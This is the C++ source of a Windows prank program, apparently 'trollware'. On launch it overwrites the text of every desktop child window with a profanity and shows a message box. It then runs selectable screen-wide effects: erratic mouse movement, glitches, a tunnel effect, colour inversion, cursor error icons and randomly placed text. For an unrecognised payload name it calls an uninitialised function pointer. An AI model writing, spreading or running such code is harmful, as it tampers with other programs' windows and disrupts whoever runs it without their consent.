#include "main.h"

using namespace std;

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam)
{
    SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)L"GETFUCKED", SMTO_ABORTIFHUNG, 100, NULL);
    return TRUE;
}

int main(int argc, char **argv)
{
    srand(time(NULL));

    EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
    lolMsgBox();

    HDC hdc = GetDC(0);

    SetTextColor(hdc, RGB(255, 0, 0));
    SetBkColor(hdc, RGB(0, 0, 0));
    SetBkMode(hdc, OPAQUE);

    if (argc == 4)
    {
        string payload = argv[1];
        int loops = atoi(argv[2]);
        int delay = atoi(argv[3]);

        void (*func)();

        if (payload == "mouse")
            func = moveMouse;
        else if (payload == "glitch")
            func = screenGlitch;
        else if (payload == "tunnel")
            func = screenTunnel;
        else if (payload == "invert")
            func = screenInvert;
        else if (payload == "errorcursor")
            func = drawErrorCursor;
        for (int i = 0; i < loops; i++)
        {
            func();
            Sleep(delay);
        }
    }
    else if (argc == 5)
    {
        std::string payload = argv[1];
        int loops = atoi(argv[2]);
        int delay = atoi(argv[3]);

        for (int i = 0; i < loops; i++)
        {
            drawText(argv[4]);
            Sleep(delay);
        }
    }
    else
    {
        printf("usage: %s [payload] [loops] [delay] {text}\n", argv[0]);
        printf("payloads:\n");
        printf("mouse - mouse glitching around\n");
        printf("glitch - screen glitches\n");
        printf("tunnel - screen tunnel effect\n");
        printf("invert - invert screen colors\n");
        printf("errorcursor - draw error on cursor\n");
        printf("text - draw text on random position\n");
    }

    return 0;
}